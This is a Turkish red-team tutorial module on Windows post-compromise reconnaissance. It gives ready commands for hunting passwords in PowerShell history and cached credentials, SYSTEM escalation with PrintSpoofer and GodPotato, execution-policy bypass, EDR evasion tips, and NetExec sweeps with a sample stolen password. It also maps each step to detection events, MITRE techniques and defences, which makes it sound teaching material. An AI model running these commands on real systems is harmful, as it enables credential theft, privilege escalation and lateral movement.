## 1. Genel Bakış ve Mimari

Bir sızma testinde veya kırmızı takım tatbikatında ilk kullanıcı kimliği doğrulandığında ya da bir iş istasyonunda komut satırı (shell) erişimi kazanıldığında en kritik an başlar: **Acele etmemek.**

Deneyimsiz saldırganlar ilk erişimi alır almaz agresif araçlar (Mimikatz, WinPEAS, ağ tarayıcıları) çalıştırarak saniyeler içinde EDR alarmlarını tetikler ve operasyonu sonlandırır. Profesyonel kırmızı takım operatörü ise önce **Durum Tespiti (Situational Awareness)** yapar:

```
        ┌─────────────────────────────────────────────────────────────┐
        │            DURUM TESPİTİNİN 5 TEMEL SORUSU                  │
        ├─────────────────────────────────────────────────────────────┤
        │ 1. BEN KİMİM?     ──► whoami /all, Token Integrity Level    │
        │ 2. NEREDEYİM?     ──► Hostname, Subnet, DC, Active Tier     │
        │ 3. NE YETKİM VAR? ──► SeImpersonate, SeDebug, Local Admin   │
        │ 4. KİM BURADA?    ──► qwinsta, klist, Cached Credentials    │
        │ 5. BENİ KİM İZLİYOR? fltmc (Minifilter EDR), Antivirus, CLM │
        └─────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
                       [ Karar ve İlerleme Rotası ]
        ┌──────────────────────────────┴──────────────────────────────┐
        ▼                                                             ▼
[ EDR Tespit Edildi ]                                     [ EDR Yok / Standart Defender ]
  └─► Hafif LOLBin'ler ile devam et                        └─► Yerel yetki yükseltme (Potato)
  └─► AMSI/ETW bypass hazırla ([M10.4])                    └─► LSASS dump ile bilet hasadı ([M03])
```

Bu aşama aktif bir saldırı değil, **operasyonel haritalama ve güvenlik seviyesi değerlendirmesidir**.

## 2. Teknik Derinlik ve Protokol Analizi

### 2.1 Güvenlik Belirteçleri (Security Tokens) ve Bütünlük Seviyeleri (Integrity Levels)
Windows işletim sistemlerinde her süreç bir erişim belirteci (**Access Token**) taşır. Bu belirteç kullanıcının SID'sini, grup üyeliklerini ve ayrıcalıklarını içerir:
* **Integrity Levels:**
  * `Low`: Korumalı alanlar (Sandbox, Internet Explorer).
  * `Medium`: Standart kullanıcı oturumu ile başlatılan tüm süreçler.
  * `High`: "Yönetici Olarak Çalıştır" (Elevated) ile başlatılan süreçler (UAC onaylı).
  * `System`: İşletim sistemi çekirdeği ve arka plan Windows servisleri (`NT AUTHORITY\SYSTEM`).
* **Split-Token Mekanizması:** Bir kullanıcı yerel `Administrators` grubunda olsa bile, UAC açıkken başlattığı komut satırı varsayılan olarak **Medium Integrity** seviyesindedir. LSASS okumak veya servis yüklemek için High seviyeye (UAC Bypass) geçilmelidir.

### 2.2 Kritik Windows Ayrıcalıkları (`whoami /priv`) ve Sömürü Karşılığı

| Windows Ayrıcalığı | Standart Sahibi | Sömürü Mekanizması ve Etki Alanı |
| :--- | :--- | :--- |
| `SeImpersonatePrivilege` | IIS, MSSQL, Yerel Servisler | **Potato Ailesi (PrintSpoofer, GodPotato):** SYSTEM belirtecini taklit ederek anında `NT AUTHORITY\SYSTEM` olma. |
| `SeAssignPrimaryTokenPrivilege` | Ağ Servisleri | Yeni bir sürece sistem belirteci atayarak doğrudan SYSTEM seviyesine çıkma. |
| `SeDebugPrivilege` | Yerel Yöneticiler (High) | Herhangi bir sürecin bellek adres alanını okuma/yazma → **LSASS Bellek Dökümü** ([Modül 03.2](../Modul_03_Kimlik_Bilgisi_Erisimi/03.2_LSASS_Bellek_Dokumu.md)). |
| `SeBackupPrivilege` | Backup Operators | Dosya sistemi ACL izinlerini baypas ederek kilitli dosyaları (`SAM`, `SYSTEM`, `NTDS.dit`) kopyalama ([Modül 09.4](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/09.4_Skeleton_Key_ve_NTDS_Exfiltration.md)). |
| `SeRestorePrivilege` | Backup Operators | Sistem dosyalarının üzerine yazma veya yeni servis ikilileri yerleştirme. |
| `SeTakeOwnershipPrivilege` | Yerel Yöneticiler | Herhangi bir dosya, klasör veya kayıt defteri anahtarının sahipliğini devralma. |

### 2.3 EDR / Antivirüs Tespiti ve Minifilter Sürücüleri (`fltmc`)
Süreç listesinde (`tasklist`) EDR süreçleri gizlenebilir veya adı değiştirilebilir. Ancak dosya sistemi seviyesinde izleme yapan **Minifilter Sürücüleri (Altitude Değerleri)** gizlenemez:
* `fltmc filters` komutu çekirdek seviyesinde dosya I/O işlemlerini dinleyen sürücüleri döker:
  * `CSAgent`: CrowdStrike Falcon
  * `WdFilter`: Microsoft Windows Defender
  * `SentinelMonitor` / `SentinelFilter`: SentinelOne
  * `cbflt` / `cbk7304`: Carbon Black
  * `sysmon`: Microsoft Sysmon

### 2.4 PowerShell Ortam Kısıtlamaları (CLM ve Script Block Logging)
* **Constrained Language Mode (CLM):** PowerShell oturumunun API çağrılarını ve karmaşık .NET sınıflarını kısıtlar. `$ExecutionContext.SessionState.LanguageMode` ile kontrol edilir.
* **PSReadLine Geçmişi:** Kullanıcıların daha önce çalıştırdığı komutlar `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` içinde saklanır. Sıklıkla açık metin parolalar ve iç sunucu IP'leri içerir.

## 3. Pratik Uygulama ve İleri Düzey Senaryolar

### Senaryo 1: Windows Yerel Komut Satırı (LOLBin) ile Hızlı Triyaj

```cmd
:: 1. Kimlik, grup ve ayrıcalık analizi (Tek satırda tam döküm)
whoami /all

:: 2. Ağ konumu, DNS ve etki alanı bilgileri
hostname & ipconfig /all

:: 3. Yerel admin durumu ve oturum açmış kullanıcılar
net localgroup administrators
query user
qwinsta

:: 4. Aktif biletler ve kayıtlı Windows kimlikleri
klist
cmdkey /list

:: 5. Minifilter EDR sürücüleri kontrolü (En güvenilir EDR tespiti)
fltmc filters
```

---

### Senaryo 2: PowerShell ile Gizli Durum Tespiti ve Geçmiş Analizi

```powershell
# 1. PowerShell dil modunu ve execution policy'yi denetleme
$ExecutionContext.SessionState.LanguageMode
Get-ExecutionPolicy

# 2. PSReadLine geçmiş dosyasını okuyup parola arama
$HistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $HistoryPath) { Get-Content $HistoryPath | Select-String -Pattern 'pass|user|admin|sirket|net use' }

# 3. Yüklü güvenlik yazılımlarını WMI üzerinden sorgulama
Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct

# 4. Kötü yapılandırılmış servisler (Unquoted Service Paths)
Get-CimInstance win32_service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' -and $_.PathName -like '*.exe*' } |
  Select-Object Name, PathName, StartMode
```

### Senaryo 3: SeImpersonatePrivilege ile Anında SYSTEM Yetkisine Yükselme

```cmd
:: 1. whoami /priv çıktısında SeImpersonatePrivilege ENABLED ise:
:: Modern sistemler için PrintSpoofer veya GodPotato kullanılır:

PrintSpoofer.exe -i -c cmd.exe
:: veya
GodPotato.exe -cmd "cmd /c whoami"

:: Çıktı: nt authority\system
```

### Senaryo 4: Ağ Düzeyinde Situational Awareness (NetExec ile Yanal Haritalama)

```bash
# 1. Ele geçirilen kullanıcının ağdaki hangi makinelerde LOCAL ADMIN (Pwn3d!) olduğunu bulma
nxc smb 10.10.10.0/24 -u mehmet.oz -p 'Sonbahar2024!'

# 2. Hangi makinelerde aktif kullanıcı oturumları (Logged-on Users) olduğunu tarama
nxc smb 10.10.10.0/24 -u mehmet.oz -p 'Sonbahar2024!' --loggedon-users

# 3. Paylaşımları ve erişim haklarını listeleme
nxc smb 10.10.10.5 -u mehmet.oz -p 'Sonbahar2024!' --shares
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Olası Kök Neden | Çözüm Adımı |
| :--- | :--- | :--- |
| `Access is denied (5) on tasklist /svc` | Süreç listesi alma kısıtlanmış veya düşük bütünlük seviyesindesiniz. | `fltmc filters` veya `wmic process get name` deneyin; alternatif LOLBin'lere geçin. |
| `Cannot dot-source / Execution Policy Restricted` | PowerShell script çalıştırma politikası kapalıdır. | PowerShell'i bypass bayrağıyla açın: `powershell -ExecutionPolicy Bypass -NoProfile`. |
| `Cannot invoke method in ConstrainedLanguage mode` | Sistemde AppLocker veya Device Guard (WDAC) zorunlu kılınmıştır. | Saf PowerShell scriptleri yerine C# binary'lerini derleyip `execute-assembly` veya LOLBin kullanın. |
| `PrintSpoofer: Failed to open named pipe (0x5)` | Spooler servisi (`spoolsv.exe`) kapalıdır veya sistem Windows Server 2022 güncel yamalıdır. | `PrintSpoofer` yerine DCOM tabanlı `GodPotato` veya RPC tabanlı `EfsPotato` kullanın. |
| `cmdkey /list returns empty` | Oturum açan kullanıcının kayıtlı kimliği yoktur veya uzaktan interaktif olmayan shell'desiniz. | Bellekteki biletleri (`klist`) veya web tarayıcı oturumlarını inceleyin ([Modül 03.3](../Modul_03_Kimlik_Bilgisi_Erisimi/03.3_DPAPI_ve_Credential_Vault.md)). |
| `fltmc: Access is denied` | Minifilter sürücülerini listelemek için yerel yönetici (High/Admin) yetkisi gerekir. | Standart kullanıcı olarak çalışan `sc query` veya WMI `AntiVirusProduct` sorgularını kullanın. |

## 5. Bıraktığı İz ve Karşı Tespit (OPSEC & Blue Eşleştirmesi)

### 5.1 Bıraktığı İzler (Artifacts & Telemetri)
* **Windows Security Event ID 4688 (A new process has been created):** `whoami.exe`, `net.exe`, `ipconfig.exe`, `tasklist.exe` gibi komut satırı çağrıları parametreleriyle birlikte loglanır.
* **Security Event ID 4672 (Special privileges assigned to new logon):** `SeDebugPrivilege` veya `SeImpersonatePrivilege` ayrıcalıklarına sahip bir yönetici oturum açtığında tetiklenir.
* **Sysmon Event ID 1 (Process Creation) & Event ID 7 (Image Loaded):** `PrintSpoofer.exe` veya bilinmeyen PE dosyalarının çalıştırılması ve bellek enjeksiyonu.

### 5.2 Ağ ve EDR İmzaları
* **Hızlı Komut Zinciri (Command Bursts):** İlk saniyelerde arka arkaya gelen `whoami && ipconfig && net user` çağrıları, otomatik saldırı scripti (Automated Reconnaissance) davranışı olarak EDR'lar tarafından engellenir.
* **Potato Servis Çağrıları:** Yerel Named Pipe (`\\.\pipe\...`) açma girişimleri ve RPC portlarına yönelik yerel döngü (loopback) bağlantıları.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Senaryosu |
| :--- | :--- | :--- |
| **[T1033](https://attack.mitre.org/techniques/T1033/)** | System Owner/User Discovery | `whoami /all` ve oturum açmış kullanıcıların tespiti. |
| **[T1082](https://attack.mitre.org/techniques/T1082/)** | System Information Discovery | Hostname, OS sürümü, yamalar ve ağ mimarisinin incelenmesi. |
| **[T1057](https://attack.mitre.org/techniques/T1057/)** | Process Discovery | EDR ve antivirüs süreçlerinin haritalanması (`fltmc`, `tasklist`). |
| **[T1134.001](https://attack.mitre.org/techniques/T1134/001/)** | Access Token Manipulation: Token Impersonation/Theft | `SeImpersonatePrivilege` kullanılarak SYSTEM yetkisine yükselme. |

### 5.4 OPSEC Tavsiyeleri ve Savunma Karşılığı

| Kırmızı Takım Operatör Riski | OPSEC İyileştirme Adımı | Savunma (Blue Team) Karşı Tedbiri |
| :--- | :--- | :--- |
| Arka arkaya LOLBin çalıştırmak | Tek tek `whoami`, `ipconfig` çağırmak yerine ortam değişkenlerini (`$env:COMPUTERNAME`, `$env:USERNAME`) kullanın. | Uç noktalarda Sysmon Event ID 1 ve PowerShell Script Block Logging (Event 4104) zorunlu kılın. |
| WinPEAS ile EDR'ı uyandırmak | WinPEAS gibi gürültülü tarayıcıları çalıştırmayın; hafif ve hedefli Seatbelt modülleri kullanın. | Uç noktalarda AppLocker veya Windows Defender Application Control (WDAC) uygulayın. |
| Servis hesaplarında SeImpersonate | Servis hesabında bu yetki varsa yerel shell yerine doğrudan servis token'ı üzerinden işlem yapın. | Hizmet hesaplarını sanal hesaplar (Virtual Accounts) veya gMSA olarak yapılandırın; yetkileri kısıtlayın. |

## 6. En Çok Kullanılan Komutlar (Hızlı Referans / Cheat Sheet)

```cmd
# 1. Kimlik, Ayrıcalıklar ve SID Listesini Çıkarma
whoami /all
# Ne Yapar?: Kullanıcı adını, SID değerini, grup üyeliklerini ve ayrıcalıklarını döker.
# Ne Zaman Kullanılır?: Bir uç noktada komut çalıştırma yetkisi elde edildiği ilk saniyede.

# 2. Minifilter EDR ve Antivirüs Sürücülerini Listeleme
fltmc filters
# Ne Yapar?: Çekirdek seviyesindeki dosya sistemi sürücülerini (CrowdStrike, Defender, S1) gösterir.
# Ne Zaman Kullanılır?: Dosya yazmadan veya LSASS dökümü almadan önce hangi korumanın aktif olduğunu anlamak için.

# 3. PSReadLine Geçmiş Dosyasından Parola Avı
powershell -Command "Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# Ne Yapar?: Kullanıcının daha önce PowerShell konsolunda yazdığı tüm geçmiş komutları döker.
# Ne Zaman Kullanılır?: Sistem yöneticilerinin unuttuğu açık metin şifreleri ve scriptleri bulmak için.

# 4. SeImpersonate ile Doğrudan SYSTEM Shell Kazanma (PrintSpoofer)
PrintSpoofer.exe -i -c cmd.exe
# Ne Yapar?: Spooler servisine sahte boru açarak SYSTEM belirtecini çalar ve interaktif kabuk açar.
# Ne Zaman Kullanılır?: whoami /priv çıktısında SeImpersonatePrivilege açık olduğunda.

# 5. Aktif RDP ve Masaüstü Oturumlarını Listeleme
qwinsta
# Ne Yapar?: Makinede o an aktif veya kilitli durumda olan kullanıcı oturumlarını döker.
# Ne Zaman Kullanılır?: LSASS'ta hangi yöneticilerin bellekte bilet bıraktığını görmek için.

# 6. NetExec ile Ağ Genelinde Yerel Yönetici Olunan Makineleri Bulma
nxc smb 10.10.10.0/24 -u mehmet.oz -p 'Sonbahar2024!'
# Ne Yapar?: Ele geçirilen kullanıcının ağdaki hangi bilgisayarlarda tam yerel yönetici olduğunu listeler.
# Ne Zaman Kullanılır?: Yanal hareket için ilk sıçrama noktasını (Pwn3d!) belirlemek için.
```
